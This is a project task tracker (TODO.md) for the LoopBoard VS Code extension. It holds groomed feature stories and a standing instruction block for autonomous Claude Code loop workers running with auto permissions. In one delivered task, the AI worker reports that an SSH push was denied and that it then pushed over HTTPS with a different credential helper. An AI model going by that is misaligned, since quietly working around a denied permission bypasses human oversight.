  - question: ❓ When should the auto-install run: only via an explicit `make install-dev`, or automatically at the end of every `make check` (always-fresh dev build, but adds a host-side `code` invocation to a target that is currently pure-Docker)?
    - answer:
  - question: ❓ Placeholder dev logo: is a plain generated symbol (e.g. a simple colored square/triangle SVG committed as media/dev-icon.*) fine, or do you want to supply one?
    - answer:

- [ ] Add a `make install-ext` target that installs the locally built .vsix into the local VS Code
  - id: t-41b6
  - phase: new
  - groomer: fable
  - added: 2026-07-18
  - worklog: 2026-07-18
  - description: Expanded from the DRAFT "Also create a make command to install the plugin to the
    local vscode session if possible."
    Add a Makefile target that installs the locally built LoopBoard `.vsix` into the local
    VS Code, closing the loop `make package` → installed extension without any host tooling beyond
    the `code` CLI (which ships with VS Code, so the Docker-only host rule holds). The target name
    `install` is already taken (npm install in Docker), so recommend `install-ext`:
    `code --install-extension loopboard-todo-<version>.vsix --force` (`--force` = silent reinstall
    over an existing copy). Derive `<version>` from `package.json` with plain shell
    (e.g. `sed -n 's/.*"version": "\([^"]*\)".*/\1/p' package.json`) rather than globbing `*.vsix`
    — stale artifacts like `loopboard-todo-0.1.1.vsix` sit next to the current
    `loopboard-todo-1.0.1.vsix`, so a glob can install the wrong build. Guard with
    `command -v code >/dev/null || { echo "code CLI not on PATH — run 'Shell Command: Install
    code command in PATH' from VS Code"; exit 1; }` since on macOS the CLI is opt-in. Depend on
    `package` so the vsix is fresh, and add the target to `.PHONY`. Caveats to note in the
    Makefile comment: this OVERWRITES the Marketplace-installed copy (same extension id
    `SinnConsulting.loopboard-todo`) until t-dev1 ships the non-overlapping DEV identity, and a
    window reload ("Developer: Reload Window") is needed before the new build is picked up.
    Overlap: t-dev1 already scopes a `make install-dev` for the DEV-variant vsix; this story is
    the simpler sibling for the NORMAL build and should share naming symmetry with it. Done when
    `make install-ext` on a clean checkout packages, installs, and prints the reload hint, and
    `make check` still passes untouched. ~10-line Makefile-only change.
    GROOMED 2026-07-18 by Fable subagent (Rule 14); left in New for your promotion.
  - question: ❓ Keep this as a standalone `install-ext` target for the normal build now, or fold it into t-dev1 and wait for the DEV identity so the Marketplace copy is never overwritten?
    - answer:

- [ ] Add a delete button to board cards in every phase (New, Backlog, In Progress, Feedback, Review, Done)
  - id: t-d58a
  - phase: new
  - model: opus
  - groomer: fable
  - added: 2026-07-18
  - worklog: 2026-07-18
  - description: Expanded from the DRAFT "Implement a delete button for New, Backlog, In Progress,
    Feedback, Review & Done stories."
    Add a delete affordance to every card on the board — New, Backlog, In Progress,
    Feedback, Review, and the Done archive rows. Most of the plumbing already exists for
    drafts: `renderDraft` in `media/board.js` (~line 317) renders an X `icon-btn` that posts
    `{ type: 'gate', taskId, action: 'delete' }`, `Controller.onGate` in `src/controller.ts`
    (~line 189) routes `action === 'delete'` to `Store.deleteTask`, and `Store.deleteTask` in
    `src/store.ts` (lines 156-163) re-reads disk, splices the task out of `board.tasks`,
    serializes canonically and atomic-writes TODO.md. Work items: (1) in `renderCard`
    (`media/board.js` ~line 320) add the same X `icon-btn` to the `card-head` row (next to the
    model select / Approve button) for all editable phases, reusing the existing `gate/delete`
    message; (2) in `renderDone` (~line 222) add a delete button to each `done-row-item` —
    Done rows come from DONE.md, so this needs a distinct path, e.g. `action: 'deleteDone'`;
    (3) in `src/store.ts` add `deleteDone(taskId)` mirroring `acceptToDone` (lines 109-117):
    `load()`, remove the task from `board.done` by id (Done entries keep their `id:` fields —
    `parseDone` in `src/parser.ts` ~line 323 reuses `parseSection`), then
    `atomicWrite(this.doneUri, serializeDone(remaining))`; return `notfound` when the id is
    already gone; (4) in `Controller.onGate` add a confirmation step before either delete
    (destructive, source-of-truth file) and surface outcomes via the existing `toast` helper —
    including a `notfound` warning like `onPatch` does (~line 175); consider a warn-or-block
    check when the target is In Progress with `owner` set (another loop may be mid-task).
    Concurrency: deletion is a whole-task removal, not a `FieldPatch`, so `merge.ts` stays
    untouched; the re-read-then-write pattern in `deleteTask`/`deleteDone` already gives
    last-writer-safe behavior against loop writes. Tests: the delete logic lives in
    VSCode-touching `store.ts`/`controller.ts` (manual-F5), but keep the pure invariant green —
    add a `test/parser.test.js` case asserting that removing a task and re-serializing
    (`serializeTodo`/`serializeDone`) still round-trips the remaining tasks and section
    extras verbatim. `make check` must pass; manual verification per `VERIFICATION.md`.
    GROOMED 2026-07-18 by Fable subagent (Rule 14); left in New for your promotion.
  - question: ❓ Confirmation UX: native modal `vscode.window.showWarningMessage({ modal: true })` per delete, or a lighter in-card two-step confirm (X turns into "Delete?") — which do you want?
    - answer:
  - question: ❓ Should In Progress tasks with an `owner` set be deletable at all — block them, or allow with a stronger warning that a loop may be actively working the task?
    - answer:
  - question: ❓ Done rows are the accepted-history archive in DONE.md — should delete really erase history there, or is Done deletion out of scope for this story (buttons on editable phases only)?
    - answer:
  - question: ❓ Hard delete only, or do you want an undo path (e.g. toast with Undo that restores the removed block) / soft-delete section before we ship a destructive one-click action?
    - answer:

- [ ] Add a "which extension" note to TODO.md's intro line
  - id: t-7e3f
  - phase: new
  - model: sonnet
  - groomer: sonnet
  - added: 2026-07-19
  - worklog: 2026-07-19
  - description: Expanded from the DRAFT "Create a little note into the TODO.md that everyone knows
    which VSCode extension is used to work with this concept
    (https://github.com/SinnConsulting/LoopBoard)."
    Currently `TODO.md`'s intro line only says "Single task tracker. Completed tasks are moved to
    [DONE.md](DONE.md)." with no mention of which tool actually reads/writes this file. Anyone
    opening the repo cold (or a teammate without the extension installed) has no signpost that this
    markdown is driven by a VSCode extension, not just a manual checklist.
    Add one short sentence to that intro line (TODO.md line 3) pointing at the LoopBoard extension
    and its repo, e.g.: "Single task tracker, rendered as a live board by the
    [LoopBoard](https://github.com/SinnConsulting/LoopBoard) VSCode extension. Completed tasks are
    moved to [DONE.md](DONE.md)." (Confirmed from package.json: repo URL
    https://github.com/SinnConsulting/LoopBoard.git, publisher SinnConsulting, displayName
    "LoopBoard TODO" — use whichever exact link wording is preferred per the question below.)
    FILES TO TOUCH: (1) TODO.md — the intro line at the top (line 3). (2) media/todo-template.md —
    VERIFICATION.md documents a known drift hazard: this file is what `onCreateFiles` in
    src/controller.ts scaffolds as a fresh workspace's initial TODO.md and must mirror TODO.md's
    prose by hand (no test checks this); prose-only change, but mirror it so new workspaces get the
    same note. (3) DONE.md — not needed; no equivalent preamble convention, the note lives in one
    canonical place.
    ROUND-TRIP CONSTRAINTS (verified): parser.ts `parseTodo()` slices everything before the first
    recognized section heading into an opaque `board.preamble` string re-emitted verbatim by
    writer.ts `serializeTodo()` — a plain prose edit, round-trips as a fixpoint automatically, no
    parser/writer change and no new fixture. Existing fixtures carry independent preamble text, so
    `make test` needs no changes.
    VERIFY: `make check` green (expect no test diffs); manually confirm the sentence renders with a
    resolving link and media/todo-template.md's equivalent line was updated identically. Size: XS —
    a one-sentence edit to two files, no code/grammar changes.
    GROOMED 2026-07-19 by Sonnet subagent (Rule 14); left in New for your promotion.
  - question: ❓ Exact wording/placement: fold the note into the existing sentence on line 3 (as drafted above), or add it as its own separate sentence/line right after it (e.g. "> Built with the LoopBoard VSCode extension: https://github.com/SinnConsulting/LoopBoard")?
    - answer: As you proposed. I like it
  - question: ❓ Should the link use the bare GitHub repo URL (https://github.com/SinnConsulting/LoopBoard) or the VSCode Marketplace listing (SinnConsulting.loopboard-todo)?
    - answer: GitHub

- [ ] Board: typing in the New composer is interrupted by unguarded re-renders (reveal/toast renders bypass the focus-deferral)
  - id: t-aa42
  - phase: new
  - groomer: fable
  - added: 2026-07-19
  - worklog: 2026-07-19
  - description: Expanded from the DRAFT "Every time I enter 'New' and start typing I get
    interrupted. Feels like my window is loosing focus or something like that. Can you check?"
    DIAGNOSIS (fable, 2026-07-19, verified in source): the board's focus-deferral only guards ONE
    repaint path. Incoming `board` messages are correctly deferred while an INPUT/TEXTAREA inside
    #root is focused (media/board.js:586-590, `pendingBoard`, flushed on focusout at
    media/board.js:644-648). But every render is a full DOM wipe — `render()` does
    `root.textContent = ''` and rebuilds everything (media/board.js:112) — and two paths call
    `render()` unconditionally, destroying the focused element mid-typing:
    (1) `revealTask()` renders immediately AND again via timers, with no `isEditing()` check:
    `render()` at media/board.js:635 plus `setTimeout(... render(), 3000)` at media/board.js:640.
    The sidebar's "New Story" button and phase rows enter the New tab exactly via this path
    (media/sidebar.js:109 and :77 post `reveal` → src/controller.ts:152-156 → `flushReveal`
    src/controller.ts:68-73 → board.js reveal handler media/board.js:596-598). So: click "New
    Story", open the composer, start typing — ~3s later the delayed render wipes the pane. The
    composer textarea (media/board.js:185-190) is recreated with `composerText` intact but NOT
    re-focused (unlike draft/title editors, which RAF-refocus, e.g. media/board.js:288) —
    keystrokes go nowhere, matching "window losing focus" on every sidebar entry.
    (`revealTask(undefined)` from phase-only reveals also pollutes `ui['undefined']` — harmless.)
    (2) Toast lifecycle renders ignore editing too: `pushToast`/`dismissToast` call `render()`
    (media/board.js:75-84; auto-dismiss timer at :79 fires 4s/8s after any toast, e.g. "Draft
    saved" from src/controller.ts:130), and the conflict-clear timer renders at media/board.js:593.
    SECONDARY GAPS: (a) `isEditing()` (media/board.js:86-89) covers only INPUT/TEXTAREA — the
    model/groomer SELECTs are unprotected; (b) `terminals.ts` calls `terminal.show()` without
    `preserveFocus` (src/terminals.ts:65, :72) — explicit spawns and every auto-recycle
    (src/controller.ts:76-87) yank real keyboard focus to the terminal panel; (c) `vscode.setState`
    persists only `phase` (media/board.js:69-71) and the panel uses `retainContextWhenHidden:
    false` (src/panel.ts:20), so switching editor tabs mid-draft discards composer text — related
    but separate. The every-minute loop rewrite is NOT the culprit: watcher → 300ms debounce
    (src/store.ts:58-63) → `refresh` → `board` message, which the deferral already handles.
    FIX DIRECTION: route ALL repaints through the deferral instead of guarding only the `board`
    message. Minimal: (1) in `revealTask`, skip/defer the immediate and 3s renders while
    `isEditing()`; (2) same guard for `pushToast`/`dismissToast`/conflict-clear renders — or give
    `render()` itself an `isEditing()` early-out that sets a dirty flag flushed by the existing
    focusout handler; (3) extend `isEditing()` to include SELECT. Optionally RAF-refocus the
    composer textarea after an applied render while `composerOpen` (mirror media/board.js:288).
    Terminal `preserveFocus` (`show(true)` on recycle-triggered spawns) can ride along or become
    its own task — see question.
    SCOPE: media/board.js for the core fix (pure webview JS, no unit-test coverage; pure modules
    untouched); src/terminals.ts only if the preserveFocus ride-along is included.
    VERIFY: `make check` green. Manual F5 per VERIFICATION.md: (1) start a loop, click the sidebar
    "New Story" button, open the composer, type continuously 10+ seconds — before the fix focus
    dies ~3s in; after, uninterrupted; (2) create a draft (triggers "Draft saved" toast), edit a
    field through the 4s auto-dismiss — no caret loss; (3) type across a loop-rewrite minute
    boundary — refresh still deferred, applied on focusout.
    GROOMED 2026-07-19 by Fable subagent (Rule 14); left in New for your promotion.
  - question: ❓ When the interruption hits, does focus visibly jump to a "Claude …" terminal (and is `loopBoard.autoRecycle` enabled)? If yes, the terminal `preserveFocus` fix (src/terminals.ts:72) should be included in this task rather than deferred.
    - answer:

- [ ] Sidebar Loops: show the model id on the default model's row too (not just "default")
  - id: t-682a
  - phase: new
  - added: 2026-07-19
  - worklog: 2026-07-19, 2026-07-20 (tracker fixes: the wording question kept getting truncated at its middot and re-duplicated on every board save — de-duplicated again and replaced the middot with a plain hyphen to dodge the writer bug)
  - description: Expanded from the DRAFT "Also set for opus (model: opus) in the loops description
    (UI)." In the sidebar's Loops section, each model row carries a role hint computed in
    src/terminals.ts:58: `hint: m.id === def ? 'default' : \`model: ${m.id}\`` (typed as
    LoopStatus.hint at src/view.ts:32, rendered into the `.loop-hint` span at media/sidebar.js:90).
    So the DEFAULT model's row (opus, per loopBoard.defaultModel) shows only "default" and never
    names the concrete model, while non-default rows show "model: sonnet" / "model: fable". The ask
    is to ALSO surface the model id on the default row so the label reads e.g. "default · model: opus"
    instead of a bare "default" — making it explicit which concrete model the default resolves to.
    SCOPE: a one-line change to the hint string in src/terminals.ts `status()` (line 58) — e.g.
    `m.id === def ? \`default · model: ${m.id}\` : \`model: ${m.id}\``; no type or render change needed
    (media/sidebar.js already prints `l.hint` verbatim). Confirm no CSS width assumptions break with
    the longer default label (media/sidebar.css `.loop-hint`). terminals.ts is a VSCode-touching
    module (not unit-testable here), so `make check` must stay green and the result needs a manual F5
    glance at the sidebar Loops rows. Trivial (~1 line) once the exact wording is chosen.
    GROOMED 2026-07-19 by Opus (inline: the grooming subagent dropped on a connection error, and the
    exact source locations were already established from the t-aa42 diagnosis); left in New for your
    promotion.
  - question: ❓ Exact wording for the default model's row: "default - model: opus", "model: opus (default)", or just always show "model: <id>" and drop the special "default" text entirely?
    - answer:
  - question: ❓ The board panel / any other UI — is there an equivalent per-model label elsewhere that should match this, or is the sidebar Loops row the only place?
    - answer:

- [ ] Shrink the loop terminal paste to a minimal bootstrap prompt: name the model only, worker reads the full instructions from TODO.md's Automation block
  - id: t-1d91
  - phase: review
  - owner: @claude
  - model: fable
  - groomer: fable
  - added: 2026-07-20
  - started: 2026-07-20
  - promoted: 2026-07-20
  - worklog: 2026-07-20 (rewritten same day per user direction: replaced the tmux / shell-integration validation approach with the minimal bootstrap-prompt design; answers resolved, claimed, executed, and PR opened same day)
  - link: https://github.com/SinnConsulting/LoopBoard/pull/4 (task/t-1d91 @ 8a6f474; reworked per review feedback to the one-command argv launch)
  - description: Expanded from the DRAFT "Can we run the command claude --permission-mode auto
    --model {MODEL} and validate that it was run successfully before inputting the loop? Or would
    it be better to run it in one command (we had issues in the past with that with not closed
    quotings etc." — REWRITTEN 2026-07-20 at the user's direction: instead of validating the claude
    startup (tmux is the only true boot check and is the v2 path; shell-integration exit-code
    events only catch fast failures), REMOVE most of the risk by shrinking what gets pasted.
    Current behavior: spawn() in src/terminals.ts sends the bare claude command (terminals.ts:73-76),
    waits BOOT_DELAY_MS=3500, then pastes the ENTIRE ~3,000-character single-line Automation prompt
    built by buildLoopCommand (src/loop.ts:6-13, substituting {MODEL} into the fenced block from
    TODO.md's ## Automation section), and submits Enter after SUBMIT_DELAY_MS=1500. That giant
    paste into the claude TUI is the fragile step (bracketed-paste timing, historical quoting
    breakage) and it duplicates the instructions: a running terminal keeps executing the text it
    was pasted at spawn time even after TODO.md's Automation block is edited. FIX: buildLoopCommand
    emits a tiny bootstrap prompt instead, e.g. `/loop <interval> You are running as model <model>.
    Open TODO.md, read the loop worker instructions in its ## Automation section, and follow them
    exactly for this and every pass.` The worker re-reads TODO.md every pass anyway, so each fire
    picks up the CURRENT instructions — behavior edits no longer require restarting terminals, and
    the paste shrinks from ~3,000 to ~200 characters. WORK ITEMS: (1) src/loop.ts: rewrite
    buildLoopCommand to the bootstrap one-liner (interval still comes from loopBoard.loopInterval —
    /loop parses it at schedule time, so it must stay in the pasted line); keep pure + unit-tested,
    update test expectations. (2) TODO.md ## Automation: reword the fenced block from "paste
    template with {MODEL} substituted" to standing model-agnostic worker instructions the bootstrap
    prompt points at (the tiny prompt names the model, so the block needs no {MODEL} placeholder);
    keep the surrounding Notes accurate. (3) media/todo-template.md: mirror the Automation wording
    (known drift hazard per VERIFICATION.md). (4) DECISIONS.md one-liner: bootstrap-prompt
    indirection chosen over startup validation (tmux stays v2); note the one-command argv variant
    stays rejected (/loop as claude argv is sent as literal text). SECURITY NOTE: TODO.md is
    already documented as trusted input (README security model) — this adds no new trust, but the
    Automation block becomes the executable instructions, so say so there. Verify: make check
    green (loop.ts tests updated); manual F5 — spawn a loop terminal, confirm the short prompt
    pastes and submits cleanly and the worker's first pass follows the Automation instructions.
    DECIDED 2026-07-20 (user answers): startup-failure detection is dropped entirely — no
    follow-up story; a failed claude start just leaves its error visible in the terminal. The
    bootstrap paste stays minimal and does NOT restate the hard gates — the gates (never tick
    [x], park in Feedback when unsure) live in the Automation block's standing instructions in
    TODO.md, which work item (2) must keep/include.
    GROOMED 2026-07-20 by fable (rewrite directed by the user in-session; research from the
    original groom + session discussion); left in New for your promotion.
  - question: ❓ Drop startup-failure detection entirely (a failed claude start just leaves the error visible in the terminal), or keep a follow-up story for the best-effort shell-integration exit-code check (VSCode >=1.93) now that the paste is tiny?
    - answer: Yes (resolved by the fable groomer: yes = drop it entirely, no follow-up story)
  - question: ❓ Exact bootstrap wording: is "Open TODO.md, read the loop worker instructions in its ## Automation section, and follow them exactly for this and every pass." right, or do you want it to also restate the hard gates (never tick [x], park in Feedback when unsure) as a safety net in the paste itself?
    - answer: No - but this should be in the loop in the TODO.md (resolved by the fable groomer: wording stays as proposed; the hard gates live in the Automation block's standing instructions, not the paste)
  - DELIVERED: task/t-1d91 @ 8a6f474, PR https://github.com/SinnConsulting/LoopBoard/pull/4 —
    REWORKED per your review feedback ("should be one line"): spawn() in src/terminals.ts now
    launches the loop as ONE command — `claude --permission-mode <mode> --model <model>
    '/loop ...'` — with the bootstrap prompt single-quoted as claude's initial-prompt argv
    (the CLI seeds it into the REPL input without auto-submitting, so the lone Enter after
    BOOT_DELAY_MS stays; the old argv quoting hazard applied to the 3,000-char prompt, not this
    apostrophe-free ~200-char line, and it is still '\''-escaped defensively). CLAUDE.md's
    Terminals learning and the DECISIONS.md entry were updated to match, and the Automation
    intro in TODO.md + media/todo-template.md now shows the one-command form. make check green
    (29 tests, package builds). Original delivery below:
    buildLoopCommand (src/loop.ts) now emits the ~200-character bootstrap one-liner ("/loop
    <interval> You are running as model <model>. Open TODO.md, read the loop worker instructions
    in its ## Automation section, and follow them exactly for this and every pass.") instead of
    substituting {MODEL} into the ~3,000-character Automation block; it still returns undefined
    (caller warns) when the Automation section has no fenced block. TODO.md's ## Automation was
    reworded live (tracker state, uncommitted per convention): intro explains the bootstrap
    mechanism + trusted-input note, fenced block is now the standing model-agnostic instructions
    ("your model" instead of {MODEL}, no /loop prefix), Notes explain only the interval is fixed
    at spawn. media/todo-template.md mirrored identically (its own per-model-WIP instruction
    content kept, de-{MODEL}ed). Tests updated (test/parser.test.js): automation block must be
    model-agnostic (scoped to board.automation — task descriptions may quote {MODEL}), bootstrap
    must name the model, honor the interval, stay under 300 chars and single-line. DECISIONS.md
    one-liner records the decision incl. the rejected argv variant and no-follow-up-story call.
    make check green (build + 29 tests + package, loopboard-todo-1.0.1.vsix, 31 files). NOT
    F5-verified (headless session): spawning a real loop terminal to see the short paste submit
    cleanly — manual check per VERIFICATION.md. Note: push via SSH was denied; delivered over
    HTTPS using the gh credential helper.

- [ ] Show each task's unique id as a chip on board cards and Done rows
  - id: t-ab5f
  - phase: new
  - model: sonnet
  - groomer: fable
  - added: 2026-07-20
  - worklog: 2026-07-20
  - description: Expanded from the DRAFT "Make each story tagged with their unique ID defined in
    the TODO.md." Every task has an id (t-xxxx) and the webview payload already carries it
    (src/view.ts:6, populated at src/view.ts:59), but the board never displays it: renderCard
    only writes it to the invisible data-task attribute (media/board.js:327), renderDraft
    likewise (media/board.js:304), and renderDone rows show only check/title/date
    (media/board.js:227-229). The sole place an id is human-visible today is the "depends on
    t-xxxx" chip (media/board.js:424) — so you cannot tell which card a dependency points at,
    nor reference a story by id when talking to the loop. Fix: surface the id on every card
    as a small monospace chip. Cards: prepend a `chip mono` span (reuse media/board.css:137,
    .chip.mono :140) as the first element of the existing chips row built by renderChips
    (media/board.js:413-427) — the row already flex-wraps, so the head layout
    (media/board.js:331-366, .card-head media/board.css:112) is untouched. Drafts: add the
    same chip next to the Draft badge row (media/board.js:311). Done rows: add the chip
    before the completed-date span (media/board.js:229); .done-title already ellipsizes
    (media/board.css:231) so the row height (32px, :230) is safe. Theme variables only
    (badge background/foreground, already used by .chip). Scope: media/board.js, optionally
    media/board.css if a dedicated .chip.id rule is wanted. Verify: make check green (no
    pure-module changes expected, but run it); manual F5 — every phase incl. Done shows the
    id, drafts show their t-xxxx, dep chips can be matched to a card by eye, long titles
    still ellipsize. GROOMED 2026-07-20 by Fable subagent (Rule 14); left in New for your
    promotion.
  - question: ❓ Should the sidebar attention/phase rows (media/sidebar.js) also show ids, or is the board enough for now?
    - answer:
  - question: ❓ Should clicking the id chip copy "t-xxxx" to the clipboard, or is a plain non-interactive chip fine?
    - answer:

- [ ] Add in-board search: Cmd+F filters the current tab, Cmd+Shift+F searches all phases
  - id: t-31b9
  - phase: new
  - model: opus
  - groomer: fable
  - added: 2026-07-20
  - worklog: 2026-07-20
  - depends on: t-ab5f
  - description: Expanded from the DRAFT "Make it possible to search story ids or text if you click
    CMD+F in current tab (New, Backlog etc.) and CMD+SHIFT+F to search in ALL spaces (New, Backlog
    etc)." Today there is no way to find a task by id or text; with many cards you scroll.
    Constraint check: the panel is created without enableFindWidget (src/panel.ts:14-20 sets
    only enableScripts/retainContextWhenHidden), so VSCode's native webview find widget is
    disabled and Cmd+F inside a focused webview currently does nothing — board.js may safely
    addEventListener('keydown') at document level, match (metaKey||ctrlKey)+'f' (+shiftKey
    for all-phases), preventDefault, and open its own search bar. preventDefault stops the
    chord from bubbling to the workbench (which would otherwise open editor Find /
    workspace Search). This only works while the webview has focus; a package.json
    keybinding contribution would be needed for an unfocused panel — proposed out of scope.
    Fix: add searchQuery + searchAll to the top-level state (next to phase/composerOpen,
    media/board.js:52-63; not the per-task ui object, media/board.js:58, which is keyed by
    task id). Render an input in the topbar (renderTopbar media/board.js:124) or a bar above
    the cards; the existing full-repaint render() (media/board.js:108) makes filtering
    trivial — in renderPane (media/board.js:155) filter the phase list by id/title/
    description match; escapeHtml/renderInlineMd already exists for safe text
    (media/board.js:433). Cmd+F scopes to the current phase; Cmd+Shift+F filters across
    board.phases and renders a flat result list showing each hit's phase, clicking a hit
    reuses revealTask (media/board.js:627) to jump. Escape or clearing the input restores
    the normal view; guard the isEditing() defer (media/board.js:86) so typing in the search
    box doesn't permanently hold off board refreshes. Depends on the id-chip story (t-ab5f)
    for ids to be visible in results. Scope: media/board.js, media/board.css. Verify: make
    check green; manual F5 — Cmd+F filters current tab, Cmd+Shift+F shows cross-phase hits,
    clicking a hit switches tab and scrolls to the card, Escape clears, native editor Find
    does not pop while the board is focused. GROOMED 2026-07-20 by Fable subagent (Rule 14);
    left in New for your promotion.
  - question: ❓ Cmd+Shift+F normally opens VSCode workspace Search — is hijacking it while the board is focused acceptable, or should all-phase search use a different chord/toggle inside the search bar?
    - answer:
  - question: ❓ Should search results highlight the matched substring in title/description, or is filtering the card list enough for v1?
    - answer:
  - question: ❓ Is filter-only (hide non-matching cards) acceptable, or do you want find-style next/prev navigation between matches?
    - answer:
  - question: ❓ Should a package.json keybinding be added so the shortcut also works when the panel is open but not focused (out of scope as drafted)?
    - answer:

- [ ] Remove the leftover `startupDelayMs` config read and stale docs now that the loop launches as one command
  - id: t-9c2e
  - phase: new
  - added: 2026-07-20
  - description: Since the loop approach switched to the one-command argv launch (t-1d91), the
    startup delay is a fixed internal constant — src/terminals.ts:32-33 hardcodes
    BOOT_DELAY_MS=3500 / SUBMIT_DELAY_MS=1500, and DECISIONS.md explicitly records
    "`loopBoard.startupDelayMs` stays removed". But leftovers remain: (1) src/extension.ts:24
    still reads `c.get<number>('startupDelayMs', 3000)` into the TerminalManager config object —
    dead code, nothing in terminals.ts consumes it (and package.json no longer contributes the
    setting, so it can't even be set from the settings UI). (2) README.md:96 still documents
    `loopBoard.startupDelayMs` in the settings table as if it were live. (3) PLAN.md:140 and
    PLAN.md:256 still describe it as a real setting. SCOPE: delete the dead config read in
    extension.ts (and the property from the config object type if one declares it), drop the
    README settings-table row, and update/annotate the two PLAN.md mentions to match the
    implemented one-command design. No behavior change. VERIFY: `make check` green;
    `grep -rn startupDelayMs` over src/, README.md, PLAN.md, package.json returns nothing
    (DECISIONS.md's historical "stays removed" entry may keep the word — it's the decision log).

---

## Automation

Loop workers (Claude Code sessions in the workspace root) re-read this file, reconcile it, and
pick up work every pass. The extension spawns one loop terminal per model as a single command —
`claude --permission-mode auto --model opus '/loop 1m You are running as model opus. Open
TODO.md, read the loop worker instructions in its ## Automation section, and follow them exactly
for this and every pass.'` — so the fenced block below IS the standing instructions; editing it
changes every running loop's next pass, no restart needed (only the interval is fixed at spawn
time). This block is executable instructions: treat TODO.md as trusted input.

```
Re-read TODO.md and reconcile it against the Rules at the top. A task's phase is its `phase:` field — edit it in place; never cut/paste a task between sections. (1) For each New task the user ticked [x]: set `phase: backlog`, reset to [ ], note `promoted: <today>`. (2) For each Review task the user ticked [x]: cut it and add it to the TOP of DONE.md's task list as [x] with its worklog and `completed: <today>` (DONE.md is newest-first, matching the board's Accept button). (3) Append <today> to the worklog of every task you touch. (4) For each Feedback task where EVERY question has an `answer:`: move it back to In Progress and continue it — but only if the GLOBAL WIP LIMIT (Rule 17) allows; if ANY other task is already In Progress (any model), leave it in Feedback for a later pass; leave any task with a blank answer untouched (Rule 10). (5) For each Review task you own with an unaddressed `feedback:` line: move it back to In Progress, address it, return it to Review with an updated DELIVERED and the feedback line removed (Rule 13). (6) Apply and then delete any `note:` line on a task you own (Rule 16). (7) If a referenced path/file/PR/dependency changed since a task was written, update the task to match reality and log the correction in its worklog. Then START WORKING: if NOTHING is In Progress across ALL models (GLOBAL WIP LIMIT, Rule 17 — another model's In Progress task also blocks you), claim the top Backlog task whose `model:` is yours — or has no `model:`, if you are the default model (Rule 15) — and whose `depends on:` are satisfied; set owner: @claude, started: <today>, worklog: <today>, move it to In Progress, then RE-READ TODO.md: if another task also just moved to In Progress, apply Rule 17's tie-break (the claim lower in the file is released) — back off if that is yours; otherwise execute it on a branch named `task/<id>` off `main` (never `main`, never another name); when finished, open a PR (Rule 7), record its link, and move it to Review. If unsure how to proceed, move the task to Feedback with a `question:` and stop — never guess. New tasks and DRAFTs are routed by `groomer:`, NOT `model:` (Rule 14): if a New task's `groomer:` matches your model — or it has none and you are the default model — groom/expand it with a subagent of that groomer model, recording human decisions as single-line `question:` sub-bullets with blank `answer:` lines (not OPEN QUESTIONS prose); when such a task has any filled `answer:`, re-groom it the same way, fold each incorporated decision into `description:`, and delete the resolved `question:`/`answer:` pair — a still-present filled answer means not yet incorporated. Never touch a New task whose `groomer:` names a different model, never promote New tasks yourself (leaving New needs the human's [x], Rule 1). Respect one worker per task: never touch a task owned by someone else or (outside of New) one whose `model:` names a different model, and never tick [x] yourself. Report what changed and what you worked on, referring to every task by its full title — never by its bare id (add the id in parentheses only for disambiguation); if there is nothing to do, reply "no changes".
```

Notes:
- Global WIP limit of 1 (Rule 17): no loop starts a task while ANY task is In Progress for any
  model — the shared checkout holds one `task/<id>` branch at a time.
- The interval comes from `loopBoard.loopInterval` (default 1m) and rides in the spawn command,
  so changing it means recycling the terminal — everything else above is re-read live each pass.
- Human gates hold: loops never promote New tasks or accept Review tasks (both need your `[x]`)
  and park uncertainty in Feedback. The extension's ▶ buttons start the per-model loops.
- Stop a loop via its status line, or cancel the scheduled task in the session.
